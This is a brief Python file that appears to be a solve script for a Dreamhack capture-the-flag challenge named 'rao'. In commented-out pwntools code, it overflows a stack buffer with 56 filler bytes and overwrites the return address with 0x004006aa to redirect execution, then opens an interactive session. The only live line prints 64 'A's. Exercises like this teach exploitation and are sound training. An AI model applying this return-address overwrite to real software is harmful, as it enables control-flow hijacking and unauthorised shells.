# from pwn import *

# # r = remote('host3.dreamhack.games', 20209)
# r = process('./rao')

# r.recvuntil(b'Input: ')

# payload = b'\x90' * 56 + p64(0x004006aa)

# print(payload)

# r.sendline(payload)
# r.interactive()

print("A" * 64)